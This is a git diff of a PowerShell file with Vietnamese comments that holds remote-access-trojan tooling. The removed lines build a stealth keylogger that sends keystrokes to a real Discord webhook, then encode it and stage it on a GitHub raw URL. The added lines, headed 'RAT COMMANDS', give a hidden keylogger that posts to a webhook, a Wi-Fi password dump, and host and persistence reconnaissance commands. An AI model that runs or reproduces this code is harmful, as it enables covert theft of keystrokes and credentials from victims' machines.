@@ -1,17 +1,16 @@
-# Chạy script này để generate pi.txt content
-$keylogger = @"
-# Stealth Keylogger + Discord Exfil (Optimized for RAT)
-`$logfile = "`$env:TEMP\keys.log"; 
-`$webhook = 'https://discord.com/api/webhooks/1456532032522944669/Vjhe__tyv2859zCJKwPZbgDV5Vyjiozyj3kXTg5JufdC8rL2b__sZeIFr5Ro5iG9XygH';
-Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{public delegate IntPtr HK(int c,IntPtr w,IntPtr l);[DllImport(`"user32.dll`")]public static extern IntPtr SWH(int i,HK p,IntPtr m,uint t);[DllImport(`"user32.dll`")]public static extern IntPtr CNHE(IntPtr h,int c,IntPtr w,IntPtr l);[DllImport(`"kernel32.dll`")]public static extern IntPtr GMH(string m);public static HK h=HKC;public static IntPtr HKC(int c,IntPtr w,IntPtr l){if(c>=0&&w==(IntPtr)0x100){int vk=Marshal.ReadInt32(l);`$k=(char)vk;`$f=[IO.File]::AppendAllText(`$logfile,`$k);}}public static void Start(){SWH(13,h,GMH(`"user32.dll`"),0);}}';[K]::Start();while(1){`$keys=Get-Content `$logfile -ErrorAction SilentlyContinue;if(`$keys){`$body=@{content="🔑KEYS[`$(`$env:COMPUTERNAME]: `$(`$keys -join ' ')|Select-Object -Last 50} | ConvertTo-Json;(New-Object Net.WebClient).UploadString(`$webhook,'POST',`$body);Remove-Item `$logfile -Force};Start-Sleep 3}
-"@
+# ===================== RAT COMMANDS =====================
+# Keylogger với GetAsyncKeyState (đơn giản, reliable)
+powershell -nop -w hidden -exec bypass -c "$log='$env:TEMP\k.log';$h='YOUR_DISCORD_WEBHOOK_HERE';while(1){$o='';for($i=8;$i-le190;$i++){if([Windows.Input.Key]::IsKeyDown($i)){$o+=[char]$i;}};if($o){\"$(Get-Date -f 'HH:mm:ss') $o\"|Add-Content $log;};if(Test-Path $log){$c=gc $log -Tail 30;$b=@{content=\"[$($env:COMPUTERNAME)] Keys: $c\"}|ConvertTo-Json;try{irm $h -Method Post -Body $b -ContentType 'application/json'}catch{};ri $log -Force};sleep 5}"
 
-# Encode & Format cho pi.txt
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($keylogger)
-$encoded = [Convert]::ToBase64String($bytes)
-$final_cmd = "powershell.exe -nop -w hidden -enc $encoded"
+# WiFi passwords extraction
+powershell -c "netsh wlan export profile key=clear folder='$env:TEMP\' && (Get-Content '$env:TEMP\*.xml' | Select-String 'keyMaterial' -Context 0,1) 2>$null"
 
-# Copy vào GitHub pi.txt
-Write-Host "=== PI.TXT CONTENT ===" -ForegroundColor Green
-Write-Host $final_cmd
-Write-Host "`n=== SAVE THIS TO: https://raw.githubusercontent.com/conbobi/df/main/pi.txt ===" -ForegroundColor Yellow
+# System information
+powershell -c "echo 'Host:';hostname;echo 'User:';whoami;echo 'IP:';ipconfig|findstr IPv4;echo 'OS:';systeminfo|findstr /B /C:'OS Name'"
+
+# Process list (suspicious)
+powershell -c "Get-Process | Where-Object {$_.ProcessName -match '(?i)task|svch|rund|reg|wmi'}|Select-Object Name,Id,Path|Format-Table"
+
+# Persistence check
+powershell -c "echo '=== STARTUP ===';Get-CimInstance Win32_StartupCommand|Select-Object Name,Command|ft;echo '=== SERVICES ===';Get-Service|Where-Object {$_.StartType -eq 'Auto'}|Select-Object Name,DisplayName|ft -AutoSize"
+# =======================================================
